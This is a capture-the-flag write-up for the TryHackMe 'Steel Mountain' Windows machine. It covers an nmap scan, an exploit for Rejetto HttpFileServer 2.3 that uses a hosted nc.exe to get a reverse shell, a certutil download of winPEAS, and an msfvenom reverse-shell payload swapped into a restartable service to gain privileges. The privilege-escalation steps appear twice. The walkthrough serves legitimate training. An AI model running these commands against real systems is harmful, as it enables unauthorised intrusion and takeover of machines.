#TryHackMe-Steel Mountain

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-26 23:25 PKT                                                                              [13/93]
Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                          
NSE Timing: About 98.96% done; ETC: 23:27 (0:00:00 remaining)                                                                                       
Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                          
NSE Timing: About 98.96% done; ETC: 23:27 (0:00:00 remaining)                                                                                       
Nmap scan report for 10.10.252.157                                        
Host is up (0.18s latency).                                               
Not shown: 988 closed ports                                               
PORT      STATE SERVICE            VERSION                                
80/tcp    open  http               Microsoft IIS httpd 8.5                                                                                          
| http-methods:                                                           
|_  Potentially risky methods: TRACE                                      
|_http-server-header: Microsoft-IIS/8.5                                                                                                             
|_http-title: Site doesn't have a title (text/html).                                                                                                
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                            
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                                                                    
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds                                                             
3389/tcp  open  ssl/ms-wbt-server?                                        
|_ssl-date: 2020-10-26T18:26:37+00:00; 0s from scanner time.                                                                                        
8080/tcp  open  http               HttpFileServer httpd 2.3                                                                                         
|_http-server-header: HFS 2.3                                             
|_http-title: HFS /                  
49152/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49153/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49154/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49155/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49156/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49163/tcp open  msrpc              Microsoft Windows RPC                                                                                            
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows                                                            

Host script results:                 
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:84:f3:74:2b:f5 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)                                                                                
| smb-security-mode:                 
|   account_used: guest                
|   authentication_level: user                                            
|   challenge_response: supported                                         
|_  message_signing: disabled (dangerous, but default)                                                                                              
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled but not required                            
| smb2-time:                         
|   date: 2020-10-26T18:26:30                                             
|_  start_date: 2020-10-26T18:21:06                                       

```

## PORT 80

`Who is the employee of the month?`

Visit the web page on port 80 then look at the source of the web page and you'll image name which is the answer to the question.

<img src="https://imgur.com/rimrVAT.png"/>

<img src="https://imgur.com/a5L2WPI.png"/>

`Scan the machine with nmap. What is the other port running a web server on?`

PORT 8080


## PORT 8080


<img src="https://imgur.com/s1URJrD.png"/>

Clicking below at the link `HttpFileServer 2.3` will redirect you to a page

<img src="https://imgur.com/nGfv4pR.png"/>

`Take a look at the other web server. What file server is running?`

Rejetto Http File Server

`What is the CVE number to exploit this file server?`

## Searchsploit

Now we know that it's using Rejetto Http File Server version 2.3 so let's find exploits for it

<img src="https://imgur.com/WAK96sW.png"/>

Let's try using this exploit

https://www.exploit-db.com/exploits/39161

<img src="https://imgur.com/I4plTzW.png"/>

Change the local IP and local port if you want doesn't matter if you use the default `443` port in this exploit 

<img src="https://imgur.com/LUkkYbl.png"/>

Now host the `nc.exe` on you local machine which can be downloaded from github `https://github.com/int0x33/nc.exe/blob/master/nc.exe` or if your using kali linux then it will be available to  `/usr/share/windows-resources/binaries/nc.exe`

Hosting this file can be through python but remember to keep the port on `80` because that's the default port that http listens on

`python3 -m http.server 80`

Also set up a net cat listener `nc -lvp [port]`

Run the exploit with python2 39161 <target machine> 8080

<img src="https://imgur.com/UGhffUg.png"/>

Run it again because the first time you ran it just downloaded it but now when you run this exploit again it will execute `nc.exe`

<img src="https://imgur.com/I6rDzIu.png"/>

Now upload `winPEAS.exe` on the machine for that host that file locally then download it on targeted machine

```
C:\Users\bill\Desktop>certutil.exe -urlcache -f http://10.14.3.143:80/winPEAS.exe winpeas.exe
certutil.exe -urlcache -f http://10.14.3.143:80/winPEAS.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

10/26/2020  02:31 PM    <DIR>          .
10/26/2020  02:31 PM    <DIR>          ..
10/26/2020  01:57 PM           600,580 PowerUp.ps1
09/27/2019  05:42 AM                70 user.txt
10/26/2020  02:31 PM           472,064 winpeas.exe
               3 File(s)      1,072,714 bytes
               2 Dir(s)  44,155,019,264 bytes free

C:\Users\bill\Desktop>
```
Now by simply typing .\winpeas.exe

<img src="https://imgur.com/MqqNtki.png"/>

We can see that this services can be exploited so let's generate a payload named as `ASCService.exe`

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.3.143 LPORT=6666 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```
Set up the netcat listener and stop that service after that  upload it to the target machine and restart the service again

### Stoppping the service 

```
                                                                                                                                                    
C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```
### Starting the service

<img src="https://imgur.com/59JbctJ.png"/>

<img src="https://imgur.com/I8EfqsJ.png"/>


## Metasploit

<img src="https://imgur.com/m7CpvJo.png"/>

<img src="https://imgur.com/ovTUsAq.png"/>

No we want to escalate our root privileges so we will run `Powerup.ps1` powershell script to look for misconfigurations on targeted windows machine

<img src="https://imgur.com/rI8pOGx.png"/>

To enter into powershell first write `load powershell` then `powershell_shell`

<img src="https://imgur.com/3dHlaT5.png"/>

Run `. .\PowerUp.ps1` and `Invoke-AllChecks`

<img src="https://imgur.com/x6OYhwJ.png"/>

Now check for service having `canRestart` set to True

<img src="https://imgur.com/AaGL54a.png"/>

And name of the service is `AdvancedSystemCareService9`

Now generate a payload with name `ASCService.exe` 

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.3.143 LPORT=6666 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```
Set up the netcat listener and stop that service after that  upload it to the target machine and restart the service again

### Stoppping the service 

```
                                                                                                                                                    
C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```
### Starting the service

<img src="https://imgur.com/59JbctJ.png"/>

<img src="https://imgur.com/I8EfqsJ.png"/>
